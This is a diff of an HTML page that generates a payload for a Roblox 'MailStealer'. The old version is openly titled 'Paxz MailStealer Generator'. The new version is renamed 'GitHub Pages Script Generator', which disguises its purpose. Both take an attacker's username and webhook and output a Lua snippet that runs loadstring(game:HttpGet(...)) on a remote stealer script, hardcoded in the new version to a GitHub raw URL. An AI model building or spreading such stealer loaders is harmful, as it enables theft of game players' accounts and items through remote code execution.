@@ -1,46 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<title>Paxz MailStealer</title>
-	<script>
-		function copyText() {
-			// Haal de ingevoerde tekst op en zet deze in de juiste variabelen
-			var userName = document.getElementById("userName").value;
-			var webhook = document.getElementById("webhook").value;
-			var loadingText = document.getElementById("loadingText").value;
-			var script = document.getElementById("script").value;
-			
-			var scriptCode = '_G.UserName = "' + userName + '"\n';
-			scriptCode += '_G.Webhook = "' + webhook + '"\n';
-			scriptCode += '_G.loadingScreenText = "' + loadingText + '"\n\n';
-			scriptCode += 'loadstring(game:HttpGet("' + script + '"))()';
-			
-			// Kopieer de gegenereerde code naar het klembord
-			var tempInput = document.createElement("textarea");
-			tempInput.value = scriptCode;
-			document.body.appendChild(tempInput);
-			tempInput.select();
-			document.execCommand("copy");
-			document.body.removeChild(tempInput);
-			
-			// Geef een melding dat de tekst is gekopieerd
-			alert("De tekst is gekopieerd naar het klembord.");
-		}
-	</script>
-</head>
-<body>
-	<h1>Paxz MailStealer Generator</h1>
-	<p>Vul de onderstaande velden in om het script te genereren.</p>
-	<form>
-		<label for="userName">Username:</label><br>
-		<input type="text" id="userName" name="userName"><br>
-		<label for="webhook">Webhook:</label><br>
-		<input type="text" id="webhook" name="webhook"><br>
-		<label for="loadingText">LoadingText:</label><br>
-		<input type="text" id="loadingText" name="loadingText"><br>
-		<label for="script">Script:</label><br>
-		<textarea id="script" name="script"></textarea><br>
-		<input type="button" value="Kopieer tekst" onclick="copyText()">
-	</form>
-</body>
+  <head>
+    <meta charset="UTF-8">
+    <title>GitHub Pages Script Generator</title>
+  </head>
+  <body>
+    <h1>GitHub Pages Script Generator</h1>
+    <form>
+      <label for="username">Username:</label><br>
+      <input type="text" id="username" name="username"><br>
+      <label for="webhook">Webhook:</label><br>
+      <input type="text" id="webhook" name="webhook"><br>
+      <label for="loadingText">LoadingText:</label><br>
+      <input type="text" id="loadingText" name="loadingText"><br>
+      <label for="output">Script Output:</label><br>
+      <textarea id="output" rows="10" cols="50"></textarea><br>
+      <input type="button" value="Generate Script" onclick="generateScript();">
+    </form>
+
+    <script>
+      function generateScript() {
+        var username = document.getElementById("username").value;
+        var webhook = document.getElementById("webhook").value;
+        var loadingText = document.getElementById("loadingText").value;
+
+        var script = '_G.UserName = "' + username + '"\n';
+        script += '_G.Webhook = "' + webhook + '"\n';
+        script += '_G.loadingScreenText = "' + loadingText + '"\n\n';
+        script += 'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
+
+        document.getElementById("output").value = script;
+      }
+    </script>
+  </body>
 </html>
